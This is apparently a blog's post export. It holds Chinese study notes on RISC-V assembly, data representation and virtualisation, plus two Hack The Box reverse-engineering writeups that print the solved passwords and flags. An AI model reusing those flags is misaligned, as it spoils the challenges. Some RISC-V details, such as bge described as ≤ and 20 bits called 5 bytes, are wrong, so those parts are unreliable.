注意，乘法以及除法都是需要“M”拓展（M-Erweiterung）的。 乘法相关的操作基本上就是以下几种： 只不过RISC-V 的基本整数指令集中（RV32I 和 RV64I）不包含 mul 指令，乘法运算通常需要 M 扩展（RV32M/RV64M）。如果只允许使用 RV32I/RV64I 指令，则必须通过移位和加法手动实现乘法。 在硬件实现上，移位操作比乘法更快，因为移位仅涉及逻辑电路，而乘法通常需要额外的计算资源。 例子： 假设 $s1 = 0x40000000 = 2^{30}$ $ s2 = 0x80000000 = -2^{31}$ $ s1 * s2 = -2^{61} = 0xE0000000 00000000$ 那么 123mul s3, s1, s2mulh s4, s1, s2# &#123;s4,s3&#125; = s1 * s2 便会得到 $ s4 = 0xE0000000; s3 = 0x00000000$ 除法以及余数： 逻辑运算 Logische Operation和： a = b AND c 1and a,b,c 或： 1or a,b,c 异或： 1xor a,b,c 移位（Shifts）： 移位操作分为2种： 1. 逻辑移位 logischer Shift ，用 &gt;&gt;, &lt;&lt;表示 用 0 填充空出的高位，无论原数是正数还是负数(Null Bits nachgeführt)，适用于 无符号数（unsigned numbers） 计算。 例子1： 假设 1t0 = 1111 1111 1111 1111 1111 1111 1110 0111 = -25（补码表示） 那么经过 1srl t0, t0, 4 会得到 1t0 = 0000 1111 1111 1111 1111 1111 1111 1110 = 268435454（正数） 例子2： 假设 1t0 = 0000 0000 0000 0000 0000 0000 0001 1001 # 25（十进制） 那么经过 1sll t0, t0, 4 会得到 1t0 = 0000 0000 0000 0000 0000 0001 1001 0000 = 400（正数） （$400 = 25 * 2^4$） 2. 算术移位 arithmetischen Shift，用 &gt;&gt;&gt;, &lt;&lt;&lt; 表示 会保持符号位（MSB）不变 (erhält Vorzeichen, 0 oder 1 nachgeführt) 如果是正数（MSB = 0），则用 0 填充高位。 如果是负数（MSB = 1），则用 1 填充高位。 适用于 有符号数（signed numbers） 计算，保持符号正确。 例子1： 假设 1t0 = 1111 1111 1111 1111 1111 1111 1110 0111 = -25（补码表示） 那么经过 1sra t0, t0, 4 会得到 1t0 = 1111 1111 1111 1111 1111 1111 1111 1110 = -2 (负数) 左移本质上就是乘法。无论有符号数还是无符号数，左移的行为都是相同的，所以 RISC-V 没有 sla指令。 这里的 uimm 会被限制在 5-bit 的无符号整数。 数据传输（Datentransfer）读取（Lesen vom Speicher）： ld (load word) 加载内存里的值 Format： 1ld destination, offset(base) 例子： 1ld a1, 8(s0) Basisadresse (s0) zum Offset (8) addieren, Adresse = ([Wert in s0] + 8) a1存储的是地址 (s0里存储的地址+8) 的值 la (load adress) 加载地址 （算伪命令， Pseudoinstruktion） 例子： 假如现在有 12345678.datavar: .word 42.text.globl mainmain: la a0, var # 把变量 var 的地址加载进 a0（例如 a0 = 0x10010000） lw a1, 0(a0) # 把 var 这个地址处的 4 字节内容（即 42）加载进 a1 那么最终结果为 12a0 = 地址，比如 0x10010000a1 = 42 写入（Schreiben in den Speicher）： sd (store word) Format： 1sd source, offset(base) 例子： 1sd a1, 8(s0) Basisadresse (s0) zum Offset (8) addieren, Adresse = ([Wert in s0] + 8) 跳转 Sprung无条件跳转： 12j immjr reg, imm 第一个会跳转到PC = PC + imm 第一个会跳转到PC = reg + imm 有条件跳转： 格式： 1bxx r1,r2,imm bxx的可选选项： branch if equal (beq)：$r1 = r2$ branch if not equal (bne)：$r1 \\neq r2$ branch if less than (blt)：$r1 &lt; r2$ branch if greater than or equal (bge)：$r1 \\leq r2$ 例子1（if）： 12345if (i == j)&#123; f = g + h;&#125;f = f – i; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 123456# s0 = f, s1 = g, s2 = h# s3 = i, s4 = j bne s3, s4, L1 add s0, s1, s2L1: sub s0, s0, s3 例子2（if, else）： 1234if (i == j)&#123; f = g + h;&#125;else&#123; f = f - i;&#125; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 12345678# s0 = f, s1 = g, s2 = h# s3 = i, s4 = j bne s3, s4, L1 add s0, s1, s2 j doneL1: sub s0, s0, s3done: 例子2（while 循环）： 12345678// Berechne x, so dass// 2^x = 128int pow = 1;int x = 0;while (pow != 128) &#123;pow = pow * 2;x = x + 1;&#125; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 12345678910# s0 = pow, s1 = x addi s0, zero, 1 add s1, zero, zero addi t0, zero, 128while: beq s0, t0, done slli s0, s0, 1 addi s1, s1, 1 j whiledone: 注意，这样写1addi t0, 128, zero 是不合法的，即非法指令 。详见后面的“带有立即数（immediate）的命令”。 子程序调用 UnterprogrammeBegriffe： Caller（调用者）：调用函数的代码（如 main()）。 Callee（被调用者）：被调用的函数（如 simple()）。 12jal reg, offset #调用jr ra #返回 例子： 12345678int main() &#123; simple(); a = b + c;&#125;void simple() &#123;return;&#125; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 123450x00000300 main: jal simple # call0x00000304 add s0, s1, s2... ...0x0000051c simple: jr ra # return 其他的伪命令： 1mv ra, rb 跟 12add ra,rb,x0addi ra,rb,0 等价。 递归（Rekursion）普通递归例子1：阶乘 1234int factorial(int n) &#123; if (n == 0) return 1; return n * factorial(n - 1); // （递归调用后还有乘法,所以是非尾递归）&#125; 对应的RISC-V（n=4的情况示例）： 1234567891011121314151617181920212223 _start:0x200 addi a0, zero, 4 # a0 = 4，计算 4 的阶乘（作为输入参数）0x204 jal ra, magic # 跳转调用 magic 函数（递归实现阶乘），返回地址存入 ra0x208 ebreak # 程序断点（模拟器中用于停止执行） magic:0x20c beq a0, zero, break # 如果 a0 == 0，跳转到 break（0! = 1）0x210 addi sp, sp, -8 # 分配栈空间：只保存 ra 和 a0，所以是2*4=8Bits0x214 sw ra, 0(sp) # 保存返回地址 ra 到栈顶0x218 sw a0, 4(sp) # 保存当前参数 a0（n）0x21c addi a0, a0, -1 # a0 = a0 - 1，准备递归调用 magic(n-1)0x220 jal ra, magic # 递归调用 magic(n-1)，返回值仍存在 a0 中0x224 lw t0, 4(sp) # 从栈中恢复原来的 a0（也就是 n）0x228 mul a0, a0, t0 # a0 = a0 * n（也就是 n! = n * (n-1)!）0x22c lw ra, 0(sp) # 恢复之前保存的返回地址0x230 addi sp, sp, 8 # 回收栈空间0x234 jalr zero, 0(ra) # 返回调用者（函数返回） break:0x238 addi a0, zero, 1 # a0 = 1，返回 1（0! = 1）0x23c jalr zero, 0(ra) # 返回调用者 由于每次计算 factorial(n) 的值时需要先等 factorial(n-1)的计算结果先出来，所以等待期间需要将所有的 n 都给存在stack里，也就是说： 123456789101112factorial(4) → 需要等factorial(3) 的结果 → 需要等 factorial(2) 的结果 → 需要等 factorial(1) 的结果 → 需要等 factorial(0) 的结果 → 返回 1然后开始回溯计算：factorial(1): 1 * 1 = 1factorial(2): 2 * 1 = 2factorial(3): 3 * 2 = 6factorial(4): 4 * 6 = 24 而栈结构如下： 12345678910111213+--------------------+| 0x4 || 0x208 |+--------------------+| 0x3 || 0x224 |+--------------------+| 0x2 || 0x224 |+--------------------+| 0x1 || 0x224 |+--------------------+ 返回的时候则是这样：当a0=0的时候触发0x20c的beq，跳转到break，break执行完了会跳转到当前的ra（也就是stack最底下一行的0x224），然后进行这部分操作： 123450x224 lw t0, 4(sp) # 从栈中恢复原来的 a0（也就是 n）0x228 mul a0, a0, t0 # a0 = a0 * n（也就是 n! = n * (n-1)!）0x22c lw ra, 0(sp) # 恢复之前保存的返回地址0x230 addi sp, sp, 8 # 回收栈空间0x234 jalr zero, 0(ra) # 返回调用者（函数返回） 计算a0 = 1*1然后继续跳转到stack倒数第三行的0x224，重复下去知道跳转到0x208，触发断点。 例子2：最大公约数 12345678unsigned ggT(unsigned a, unsigned b) &#123; if (a == b) return a; else if (a &lt; b) return ggT(a, b - a); else return ggT(a - b, b);&#125; 对应的RISC-V： 1234567891011121314151617181920ggT: beq a0, a1, finished # 如果 a0 == a1，则跳转到 finished（返回结果） bltu a0, a1, lt # 如果 a0 &lt; a1，则跳转到 lt 标签（交换顺序） sub a0, a0, a1 # 否则 a0 &gt; a1，执行 a0 = a0 - a1 j cont # 跳转到 cont，准备递归调用lt: sub a1, a1, a0 # 执行 b = b - a （即 a1 = a1 - a0）cont: addi sp, sp, -16 # 为返回地址创建栈空间（递归调用前保存返回地址） sw ra, 0(sp) # 保存返回地址 jal ra, ggT # 递归调用 ggT（jump and link） lw ra, 0(sp) # 恢复返回地址 addi sp, sp, 16 # 回收栈空间 jalr zero, 0(ra) # 返回（跳转回上层调用） finished: jalr zero, 0(ra) # 返回当前的 a0 作为结果 总结一下： 每个Recursive的函数递归部分会分成2部分： 从当前n的情况跳转到n-1，保存当前n的值以及返回地址（即当前跳转命令的下一行的地址） 读取返回地址并用当前已经计算出来的n-1的情况的值与n进行函数运算。 相当于递减完了之后还得递增回来。 注意，2个例子里分配的stack的大小是不一样的，这个主要是看ABI的具体要求，这里主要目的是示范而已。但不管大小如何，一定要保证分配的Stack大小和回收的大小是一致的。 尾递归（Tail Rekursiob）观察上面例子里stack存储的内容不难发现，如果递归的次数较高，则会很容易导致Stack Overflow。 为了解决这个问题，我们可以使用另一种递归方式：尾递归（Tail Rekursiob） 还是拿阶乘举例，我们将代码优化成这样： 1234int factorial(int n, int acc = 1) &#123; if (n == 0) return acc; return factorial(n - 1, n * acc); // 尾调用&#125; 对应的RISC-V： 123456789factorial: beqz a0, end_factorial mul a1, a0, a1 # acc = acc * n addi a0, a0, -1 # n = n-1 tail factorial # 尾调用（跳转，无需保存返回地址）end_factorial: mv a0, a1 # 返回结果 ret 这里的调用过程则会变成： 12345factorial(3, 1)→ 直接 tail call 到 factorial(2, 3)→ 再 tail call 到 factorial(1, 6)→ 再 tail call 到 factorial(0, 6)→ 结束：返回 acc = 6 栈结构如下： 12345678910+--------------------+| 当前调用（复用栈帧）|| n=3, acc=1 |→ tail call → 替换为：| n=2, acc=3 |→ tail call → 替换为：| n=1, acc=6 |→ tail call → 替换为：| n=0, acc=6 |→ return 6 不再需要存储所有中间的 n 的值。相当于是直接跳转而不是等待。 带有立即数（immediate）的命令立即数（Immediate/Konstante）：由指令本身携带，不需要从寄存器或内容中加载 aadi a = b + imm（一个立即数） 1addi a,b,&lt;imm&gt; 注意，RISC-V里是没有subi这种操作的，因为它可以被addi代替： subi a,b,x是等价于addi a,b,-x的（这里的x是一个立即数/常数）。 但sub不可以被add替代，是因为sub a,b,-c这个操作不合规（c是一个register，不存在-c这种操作）。 这里可以使用的立即数的大小会被限制在$[-2^{11},2^{11}) = [-2048,+2047]$ （具体原因会在之后机器码的部分阐述） 生成32-Bit的常数： 需要用到 load upper immediate (lui) 和 addi lui 的作用是将一个常数加载到目标寄存器的高 20 位（也就是5Bytes），并将低 12 位（4Bytes）填充为 0。 而addi则负责将低 12 位（4Bytes）的数值加到目标寄存器中。 例子： C: 1int a = 0xFEDC8765; 对应的汇编： 123# s0 = alui s0, 0xFEDC8 # s0 = 0xFEDC8000addi s0, s0, 0x765 注意： 12addi a0, zero, -534lui a0, 0 这段运行之后会得到 a0 的值为0，因为 lui 会将低12位填充为0。 RISC-V 机器码 Machine Code/Instrunction将汇编语言翻译成机器码主要依靠下面这2张表： 首先，所有的操作会被分成6个大类： Register/register (R) Immediate (I) Upper immediate (U) Store (S) Branch (B) 条件跳转 Jump (J) 然后会通过funct3以及funct7确定具体操作。（funct7更多的是为了扩展的操作/功能。） rs1, rs2, rd存储的是寄存器的地址，而imm存储的则是立即数（immediate）的数值。其中rd是目标寄存器。 例子： 1addi a1, a2,1 假设a1（rd），a2（rs1）的地址为00010，01010， 因为addi指令的opcode和funct3为：0010011, 000 ，这行命令会翻译成以下的机器码： 123imm[11:0] | rs1 | funct3 | rd | opcode------------|-------|--------|-------|--------000000000001| 01010 | 000 | 00010 | 0010011 Store, Branch, Jump 操作的格式里将imm的值拆成好几部分（比如说imm[11:5]和imm[4:0]）是为了其他内容的位置可以对齐，比如说rs2的位置都是第20-24bit。 Branch和Jump都是跳转操作，所以会将imm（跳转地址）的第一位（符号位）imm[12]或者imm[20]放在开头，以确定是向后跳转还是向前。然后因为RISC-V的命令都是32位的，也就是4Byte，所以所有地址都是4的倍数，也就不需要imm[0]的信息了，因为imm[0]始终等于0。 例题例题1Register s5 nullen 将寄存器s5的值设为0： 123mov s5, 0#或者是li s5, 0 例题2Wert in Register a1 nach s3 kopieren 将s3的值复制到s1里： 1mv s3, a1 例题3Dasunterste Bit von a0 nach t1 schreiben, restliche Bits sollen 0 sein 将 a0 的最低位写入 t1，其他位清零: 1andi t1, a0, 1 1在二进制中只有最后一位是1，其他位置都是0，所以a0的其他位置与0进行and操作都会得到0，而最后一位与1进行and操作会保留原本内容。 例题4Register s1 mit Einsen füllen 将寄存器 s1的值的每一位都设为 1： 1li s1, -1 因为-1 的二进制表示全 1 例题5Unterstes Byte von t0 nach a0 schreiben, Rest unverändert 将 t0 的最低字节写入 a0，保持其余部分不变： 12andi a0, a0, -256 # 清除 a0 的最低字节 (0xFFFFFF00)or a0, a0, t0 # 直接合并 t0 低字节 -256的二进制表示为 11111 1111 1111 1111 1111 1111 0000 0000 最后一个Byte的内容都是0，所以将它与a0进行and操作可以清除a0的最后一个Byte的内容，前面的保留。 然后将a0和t0直接进行or操作，会保留a0的前面部分，以及t0的最后一个Byte的内容。","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM-info-课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"汇编语言","slug":"汇编语言","permalink":"https://archer-baiyi.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"RISC-V","slug":"RISC-V","permalink":"https://archer-baiyi.github.io/tags/RISC-V/"}]},{"title":"1 Einführung und Datenrepräsentation","slug":"TUM info 笔记/ERA/ERA-1-Einfuhrung-und-Datenreprasentation","date":"2025-03-18T12:12:02.000Z","updated":"2025-04-26T18:30:23.988Z","comments":true,"path":"2025/03/18/TUM info 笔记/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/","permalink":"https://archer-baiyi.github.io/2025/03/18/TUM%20info%20%E7%AC%94%E8%AE%B0/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/","excerpt":"计算机体系结构基础相关笔记","text":"Einführung in die Rechnerarchitektur (ERA)DatendarstellungenZahlensystemeDezimalsystem Binärsystem Hexadezimalsystem Gängige Wortlängen Negative Ganze Zahlen假如专门用一个Bit来表示正负号（比如说)，这样子做会带来一个问题： 0 = 1+(-1) \\Longleftrightarrow 0000 0000 = 1000 0001 + 0000 0001 = 1000 0000所以一般使用Zweierkomplement，即Invertierung (Einerkomplement) + 1。 例子： 这样做的好处就是加法会非常自然： -1 + 1 = 1111 1111 + 0000 0001 = 1 0000 0000 \\rightarrow 0000 0000 = 0","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM-info-课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}]},{"title":"HTB_rev Find The Easy Pass Writeup","slug":"CTF/Reverse Engineering/HTB-rev-Find-The-Easy-Pass-Writeup","date":"2025-03-16T21:39:15.000Z","updated":"2025-04-02T21:32:57.935Z","comments":true,"path":"2025/03/16/CTF/Reverse Engineering/HTB-rev-Find-The-Easy-Pass-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/16/CTF/Reverse%20Engineering/HTB-rev-Find-The-Easy-Pass-Writeup/","excerpt":"","text":"这道题会给我们一个exe文件，打开是一个判断输入的密码是否正确的软件： 我们用IDA打开它，会发现并没有反编译出main()函数。所以我们随便输入一点内容试一下： 会返回Wrong Password!字样。接着我们尝试用IDA搜索这段内容，会发现： 点击第二个结果会跳转到： 注意到它的上方有着”Goob Job. Congratulation”的字样，我们猜测这是输入成功后返回的内容，所以我们点击它下方 XREF的内容，查看这个变量在哪里被调用过，通过反汇编会得到以下内容：12345678910111213141516171819202122232425262728293031323334353637383940414243int __fastcall TForm1_Button1Click(int a1)&#123; int v2; // ecx int v3; // edx char v4; // zf unsigned int v6[2]; // [esp-Ch] [ebp-38h] BYREF int *v7; // [esp-4h] [ebp-30h] int v8; // [esp+4h] [ebp-28h] BYREF int v9; // [esp+8h] [ebp-24h] BYREF int v10; // [esp+Ch] [ebp-20h] BYREF int v11; // [esp+10h] [ebp-1Ch] BYREF int v12; // [esp+14h] [ebp-18h] BYREF int v13; // [esp+18h] [ebp-14h] BYREF int v14; // [esp+1Ch] [ebp-10h] BYREF int v15; // [esp+20h] [ebp-Ch] BYREF int v16; // [esp+24h] [ebp-8h] BYREF int v17; // [esp+28h] [ebp-4h] BYREF int savedregs; // [esp+2Ch] [ebp+0h] BYREF v7 = &amp;savedregs; v6[1] = (unsigned int)&amp;loc_454171; v6[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v6); System::__linkproc__ LStrLAsg(&amp;v16, &amp;str_f[1]); System::__linkproc__ LStrLAsg(&amp;v15, &amp;str_o[1]); System::__linkproc__ LStrLAsg(&amp;v14, &amp;str_r[1]); System::__linkproc__ LStrLAsg(&amp;v13, &amp;str_t[1]); System::__linkproc__ LStrLAsg(&amp;v12, &amp;str_r[1]); System::__linkproc__ LStrLAsg(&amp;v11, &amp;str_a[1]); System::__linkproc__ LStrLAsg(&amp;v10, &amp;str_n[1]); System::__linkproc__ LStrLAsg(&amp;v9, &amp;str___13[1]); System::__linkproc__ LStrCatN(&amp;v17, 8, v2, v15, v14, v13, v12, v11, v10, v9); Controls::TControl::GetText(*(Controls::TControl **)(a1 + 760)); System::__linkproc__ LStrCmp(v8, v17); if ( v4 ) Dialogs::ShowMessage((Dialogs *)&amp;str_Good_Job__Congr[1], v3); else Dialogs::ShowMessage((Dialogs *)&amp;str_Wrong_Password_[1], v3); __writefsdword(0, v6[0]); v7 = (int *)&amp;loc_454178; System::__linkproc__ LStrClr(&amp;v8); return System::__linkproc__ LStrArrayClr(&amp;v9, 9);&#125; 这段代码的主要逻辑是将这些赋值变量 123456789System::__linkproc__ LStrLAsg(&amp;v16, &amp;str_f[1]);System::__linkproc__ LStrLAsg(&amp;v15, &amp;str_o[1]);System::__linkproc__ LStrLAsg(&amp;v14, &amp;str_r[1]);System::__linkproc__ LStrLAsg(&amp;v13, &amp;str_t[1]);System::__linkproc__ LStrLAsg(&amp;v12, &amp;str_r[1]);System::__linkproc__ LStrLAsg(&amp;v11, &amp;str_a[1]);System::__linkproc__ LStrLAsg(&amp;v10, &amp;str_n[1]);System::__linkproc__ LStrLAsg(&amp;v9, &amp;str___13[1]); 拼接成一个新的字符串 v17 1System::__linkproc__ LStrCatN(&amp;v17, 8, v2, v15, v14, v13, v12, v11, v10, v9); 然后比较输入的字符串与v17。所以我们只需要查看那些赋值字符串的具体值便可得到密码：fortran! 按照题目要求flag内容为：HTB{fortran!}。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/categories/CTF/Reverse-Engineering/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/tags/Reverse-Engineering/"}]},{"title":"HTB_rev Behind the Scenes Writeup","slug":"CTF/Reverse Engineering/HTB-rev-Behind-the-Scenes-Writeup","date":"2025-03-12T01:22:42.000Z","updated":"2025-04-02T21:33:08.443Z","comments":true,"path":"2025/03/12/CTF/Reverse Engineering/HTB-rev-Behind-the-Scenes-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/12/CTF/Reverse%20Engineering/HTB-rev-Behind-the-Scenes-Writeup/","excerpt":"","text":"用010 Editor （或者Hex Editor之类的都行）打开源文件，将里面所有的 0F 0B （即 ud2 ）改为 90 90 （90即NOP，是Machine Code中表示 无操作 (No Operation) 的命令），然后再用IDA打开文件即可看到完整的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int __fastcall main(int argc, const char **argv, const char **envp){ struct sigaction s; // [rsp+10h] [rbp-A0h] BYREF unsigned __int64 v5; // [rsp+A8h] [rbp-8h] v5 = __readfsqword(0x28u); memset(&amp;s, 0, sizeof(s)); sigemptyset(&amp;s.sa_mask); s.sa_handler = (__sighandler_t)segill_sigaction; s.sa_flags = 4; sigaction(4, &amp;s, 0LL); if ( argc == 2 ) { if ( strlen(argv[1]) == 12 ) { if ( !strncmp(argv[1], \"Itz\", 3uLL) ) { if ( !strncmp(argv[1] + 3, \"_0n\", 3uLL) ) { if ( !strncmp(argv[1] + 6, \"Ly_\", 3uLL) ) { if ( !strncmp(argv[1] + 9, \"UD2\", 3uLL) ) printf(\"&gt; HTB{%s}\\n\", argv[1]); return 0; } else { return 0; } } else { return 0; } } else { return 0; } } else { return 0; } } else { puts(\"./challenge &lt;password&gt;\"); return 1; }} 所以flag为 1HTB{Itz_0nLy_UD2}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/categories/CTF/Reverse-Engineering/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://archer-baiyi.github.io/tags/Reverse-Engineering/"}]},{"title":"GBS 9 Virtualisierung 虚拟化","slug":"TUM info 笔记/GBS/GBS-9-Virtualisierung-虚拟化","date":"2025-03-11T17:17:37.000Z","updated":"2025-04-26T18:31:20.121Z","comments":true,"path":"2025/03/11/TUM info 笔记/GBS/GBS-9-Virtualisierung-虚拟化/","permalink":"https://archer-baiyi.github.io/2025/03/11/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-9-Virtualisierung-%E8%99%9A%E6%8B%9F%E5%8C%96/","excerpt":"操作系统基础相关笔记","text":"Einführung Abstraktionssichten: 复杂系统可以通过抽象层更好地描述。 Fokus auf relevante Funktionalitäten 抽象层通过接口（Interfaces）相互分离（durch Schnittstellen (Interfaces) voneinander getrennt）： 使得每一层可以独立开发和实现，并且高层系统只需要与接口交互，而不需要了解底层实现。 z.B. Systemcalls: Implementierung durch Interface verborgen ： 只需要直接用read(), write()这些命令，不需要关注/知道这些调用在内核中的具体实现。 Interfaces können die Software Sicht auf die Hardware definieren ：软件可以通过接口来访问硬件，而无需直接操作硬件。 Interfaces Instruction Set Architecture (ISA): 指令集架构 Interface zwischen dem BS und Hardware 是操作系统与硬件之间的接口 besteht aud User- und System-ISA Application Binary Interface (ABI): 应用二进制接口 Interface zwischen Anwendungen und dem Betriebssystem 是应用程序与操作系统之间的接口 besteht aus dem System Call Interface und der User ISA Die Sicht auf das System hängt von der Software-Perspektive ab： 如果是开发操作系统的话，则需要考虑操作系统与硬件的交互接口（isa）； 而如果是开发普通软件的话，则更关注软件与操作系统的接口（abi），相当于通过操作系统来访问硬件。 Ein Hardware-System (physische Maschine) bietet eine Laufzeitumgebung für die darüberliegende Software： BS virtualisiert bereits: Prozesse, virtueller Speicher und Abstraktionen Eine Virtuelle Maschine implementiert eine virtuelle Laufzeitumgebung： Abbilden von virtuellen auf physische Ressourcen 虚拟运行环境的分类 System Virtual Machines（系统虚拟机） 虚拟化整个系统 Process Virtual Machines（进程虚拟机） 仅为单个进程提供虚拟环境 Anforderungen an Virtualisierung 对虚拟化的要求 Equivalences / Fidelity：等效性 虚拟化应该让操作系统和应用程序无需特殊修改（或者最小程度的改动）便可以在虚拟机上运行。 Resource Control / Safety (Isolation)： 隔离性 必须确保虚拟机（的资源）彼此不会影响；Hypervisor需要控制所有底层资源 Efficiency / Performance：性能 大部分指令应该直接在硬件上执行 系统虚拟机 （System Virtual Machines）我们为什么需要系统虚拟机？ 模拟（Emulation） 使得操作系统可以在不同的 ISA上运行，并且在虚拟机中调试操作系统通常比在物理硬件（裸机）上更方便。 隔离（Isolation） 受损或遭到攻击的 Guest OS 无法影响其他虚拟机，也无法修改 Hypervisor 本身。 安全性（Sicherheit） Hypervisor 更容易保护（代码量较小、权限较高）。 资源利用（Ressourcennutzung） 物理硬件资源可以更好（更灵活）地分配和利用。 Hypervisor / Virtual Machine Monitor (VMM) 虚拟机监控器Hypervisor负责给操作系统提供运行环境，通常会分为2类： Typ 1 Hypervisor /Bare-Metal-Hypervisor （裸机式） 直接在物理硬件上运行容器，没有额外虚拟化层的存在。这种方式的主要优点在于性能的极致优化，因为没有虚拟化带来的开销。 比如 Xen, Hyper-V, VMware ESX。 Typ 2 Hypervisor （托管式） 依赖于宿主操作系统的服务（ Verwendet Dienste des Host-BS）。 比如 KVM, VirtualBox, VMware Workstation。 Hypervisor实现了一个虚拟的 ISA，同样分User- 和 System-ISA。 Hypervisor虚拟化整个物理机器，并且提供虚拟化硬件作为借口让Gast-BS可以在上面运行。可以使得Gast-BS以为/产生错觉（Illusion）自己对硬件拥有完整的控制权。但实际上对于Hypervisor来说，Gast-BS就只是个软件而已。 这样做的好处就是一个虚拟机可以运行任意操作系统，并且可以同时运行多个相同或不同的操作系统。 Hypervisor 负责控制和虚拟化系统的硬件资源： CPU 虚拟化（CPU-Virtualisierung） 内存虚拟化（Speicher-Virtualisierung） I/O 虚拟化（I/O-Virtualisierung） 并需要确保Gast-BS不能访问未分配给它的资源。 CPU 虚拟化（CPU-Virtualisierung）CPU 的虚拟化方法一般是分以下3种： 半虚拟化（Paravirtualization）： 使用经过修改的操作系统 在虚拟机（VM）中运行，该 OS 知道自己处于虚拟化环境中。 设备驱动程序（Geräte Treiber）会通过 Hypercalls 与Hypervisor进行交互。 二进制翻译（Binary Translation）： 可以运行未经修改的操作系统，甚至可以在不同架构上运行（例如 x86 上模拟 ARM）。 Hypervisor会解释/模拟Gast-BS的部分二进制代码，所以会导致性能开销（Performance-Overhead） 这种Hypervisor的实现非常复杂。 硬件辅助虚拟化（Hardware-assisted Virtualization） 可以运行未经修改的操作系统，可以实现高效的虚拟机（effizienten VMs），减少性能损失。所以是目前最主流的。 与普通操作系统中的内核空间（Kernel Space）与用户空间（User Space）不同（但相似）的是，我们这里会讨论的是高权限的 系统模式（System Mode） 和 用户模式（User Mode）。Hypervisor 会在系统模式（System Mode）运行，而Guest-BS则是会在用户模式（User Mode）运行。 某些在用户模式下执行的指令会被 Hypervisor 在系统模式下拦截，以确保Hypervisor 拥有对虚拟机的完全控制。 （套娃，User Mode里又有Virtual User Mode 和Virtual System Mode。） ISA中的指令可以分为以下3类： 特权指令（Privileged Instructions）： 只能在系统模式（System Mode）下执行。 如果在用户模式（User Mode）下执行，则会触发陷阱（Trap），由 Hypervisor 处理。 敏感指令（Sensitive Instructions）： 其中又分为 控制敏感指令（Control-Sensitive Instructions）：将修改系统配置（例如 修改页表（Page Tables）） 与行为敏感指令（Behaviour-Sensitive Instructions）：这些指令在不同模式下（用户模式 vs. 系统模式）的行为也是不同的。 无害指令（Innocuous Instructions）： 不属于前2类的则都属于这类。 虚拟化需要确保其中的敏感指令（Sensitive Instructions）必须是特权指令（Privileged Instructions）的子集。 反例可以参考x86架构中的POPF 指令（从栈加载标志寄存器 Flags）。 内存虚拟化（Speicher-Virtualisierung）在正常的非虚拟化情况下，操作系统（OS） 会直接管理物理内存并分配给不同的进程，利用前面学到的Seitentabelle(Page Table)。但在虚拟化的情况下，Hypervisor 需要作为最高管理者（übergeordnete Instanz）负责内存资源分配，确保Gast-BS不能随意访问物理内存且只能“看到”分配给它的部分。 下面介绍内存虚拟化的2中方法： 影子页表（Shadow Page Table, SPT） 硬件辅助的二级地址转换（Second Level Address Translation, SLAT） 影子页表（Shadow Page Table, SPT）在这个方法里一共存在三个内存抽象层： 物理内存 （Host-Physische Adressen, HPA） Hypervisor 对物理内存的抽象 即分配给Gast-BS的内存 （Gast-Physische Adressen）。这些内存对于Gast-BS来说是连续的，但是在实际的物理内存里不一定连续。 虚拟内存（ Virtueller Speicher） Guest OS 维护自己的页表（这些页表 不会 被 MMU（内存管理单元） 